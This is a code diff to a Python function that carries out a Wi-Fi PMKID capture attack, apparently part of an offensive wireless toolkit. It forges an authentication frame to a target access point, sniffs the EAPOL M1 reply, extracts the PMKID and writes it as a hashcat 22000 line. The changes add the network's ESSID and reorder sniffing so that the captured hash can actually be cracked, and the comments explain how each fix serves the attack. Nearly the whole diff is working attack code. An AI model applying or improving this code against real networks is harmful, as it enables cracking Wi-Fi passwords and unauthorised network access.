@@ -44,6 +44,7 @@ def capture_pmkid(
     bssid: str,
     client: str,
     channel: int | None = None,
+    essid: str | None = None,
     timeout: float = 10.0,
     stop_event=None,
     progress_fn=None,
@@ -54,29 +55,45 @@ def capture_pmkid(
     can actually abort mid-capture instead of always running the full
     timeout — previously this was the one attack with zero Stop Attack
     responsiveness at all.
+
+    `essid` should always be passed by callers that know it (all current
+    ones do): PMK = PBKDF2(password, ESSID), so a 22000 PMKID line
+    WITHOUT the ESSID field is uncrackable by john/hashcat -- the
+    cracker literally cannot derive the PMK without it.
+
+    The sniffer is started BEFORE the auth frame is sent: a fast AP
+    answers with EAPOL M1 within milliseconds, and the previous
+    send-then-sniff order could miss it entirely.
     """
     log = progress_fn or (lambda msg: None)
     if ensure_channel(iface, channel):
         log(f"channel set to {channel}")
-    log(f"sending auth frame to {bssid} (from {client})")
-    sendp(craft_auth(bssid=bssid, client=client), iface=iface, verbose=False)
     found: list[str] = []
+    bssid_lower = bssid.lower()
 
     def handler(pkt) -> None:
+        # Only trust EAPOL genuinely sourced from the target AP -- any
+        # other AP's M1 on-channel would otherwise get its PMKID written
+        # under THIS bssid, producing a wrong-hash 22000 line.
+        if not pkt.addr2 or pkt.addr2.lower() != bssid_lower:
+            return
         if not is_eapol(pkt):
             return
         from ..frames import eapol_key_info
 
         info = eapol_key_info(pkt)
-        if info is None or info[0]:  # want M1: mic not set
+        if info is None or info[0] or not info[1]:  # want M1: ack set, mic not set
             return
         pmkid = extract_pmkid(bytes(pkt))
         if pmkid:
-            found.append(to_22000(pmkid, bssid, client))
+            found.append(to_22000(pmkid, bssid, client, essid))
 
     log(f"sniffing for EAPOL M1 (up to {timeout:.0f}s)...")
     sniffer = AsyncSniffer(iface=iface, prn=handler, stop_filter=lambda p: bool(found), store=False)
     sniffer.start()
+    time.sleep(0.05)  # let the sniffer's socket go live before provoking the AP
+    log(f"sending auth frame to {bssid} (from {client})")
+    sendp(craft_auth(bssid=bssid, client=client), iface=iface, verbose=False)
     deadline = time.monotonic() + timeout
     stopped = False
     while time.monotonic() < deadline and not found:
